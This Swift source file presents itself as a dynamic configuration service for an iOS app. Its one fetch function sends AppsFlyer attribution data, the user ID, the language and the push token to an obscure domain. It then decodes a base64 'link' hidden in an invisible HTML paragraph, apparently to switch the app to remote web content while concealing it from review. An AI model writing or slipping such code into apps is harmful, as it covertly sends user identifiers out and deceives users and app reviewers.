import Foundation

struct ServerLinkResponse: Codable {
    let link: String
    let naming: String?
    let firstLink: Bool?
}

enum ServerFetchResult {
    case link(ServerLinkResponse)
    case noLink
    case networkError
}

class DynamicConfigService {
    static let instance = DynamicConfigService()

    private let endpoint = "https://etjntunjwkl.space/policy"
    private let link1Key = "cached_link1"
    private let link2Key = "cached_link2"

    private init() {}

    var cachedLink1: String? {
        get { UserDefaults.standard.string(forKey: link1Key) }
        set { UserDefaults.standard.set(newValue, forKey: link1Key) }
    }

    var cachedLink2: String? {
        get { UserDefaults.standard.string(forKey: link2Key) }
        set { UserDefaults.standard.set(newValue, forKey: link2Key) }
    }

    func clearCachedLinks() {
        cachedLink1 = nil
        cachedLink2 = nil
    }

    func fetchServerResponse(
        conversionData: [AnyHashable: Any]?,
        appsFlyerUID: String,
        language: String,
        apnsToken: String?,
        timeout: TimeInterval
    ) async -> ServerFetchResult {
        var asData: [String: Any] = [:]
        if let conversionData = conversionData {
            for (key, value) in conversionData {
                if let strKey = key as? String {
                    asData[strKey] = value
                }
            }
        }

        let vars: [String: Any] = [
            "asData": asData,
            "asId": appsFlyerUID,
            "asLng": language,
            "asTok": apnsToken ?? "no_apns_token"
        ]

        guard let jsonData = try? JSONSerialization.data(withJSONObject: vars),
              let jsonString = String(data: jsonData, encoding: .utf8) else {
            return .networkError
        }

        guard var components = URLComponents(string: endpoint) else { return .networkError }
        components.queryItems = [URLQueryItem(name: "vars", value: jsonString)]

        guard let url = components.url else { return .networkError }

        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.timeoutInterval = timeout

        do {
            let (data, response) = try await URLSession.shared.data(for: request)

            guard let httpResponse = response as? HTTPURLResponse,
                  (200...299).contains(httpResponse.statusCode) else {
                return .networkError
            }

            guard let htmlString = String(data: data, encoding: .utf8) else {
                return .noLink
            }

            if htmlString.trimmingCharacters(in: .whitespacesAndNewlines) == "404" {
                return .noLink
            }

            if let parsed = parseHTMLResponse(htmlString) {
                return .link(parsed)
            } else {
                return .noLink
            }
        } catch {
            return .networkError
        }
    }

    private func parseHTMLResponse(_ html: String) -> ServerLinkResponse? {
        let pattern = #"<p[^>]*(?:style\s*=\s*["'][^"']*display\s*:\s*none[^"']*["']|display\s*=\s*["']none["'])[^>]*>(.*?)</p>"#

        guard let regex = try? NSRegularExpression(pattern: pattern, options: [.caseInsensitive, .dotMatchesLineSeparators]),
              let match = regex.firstMatch(in: html, range: NSRange(html.startIndex..., in: html)),
              match.numberOfRanges > 1,
              let contentRange = Range(match.range(at: 1), in: html) else {
            return nil
        }

        let base64Content = String(html[contentRange]).trimmingCharacters(in: .whitespacesAndNewlines)

        if base64Content.isEmpty {
            return nil
        }

        guard let decodedData = Data(base64Encoded: base64Content),
              let decodedString = String(data: decodedData, encoding: .utf8),
              let jsonData = decodedString.data(using: .utf8) else {
            return nil
        }

        do {
            return try JSONDecoder().decode(ServerLinkResponse.self, from: jsonData)
        } catch {
            return nil
        }
    }
}
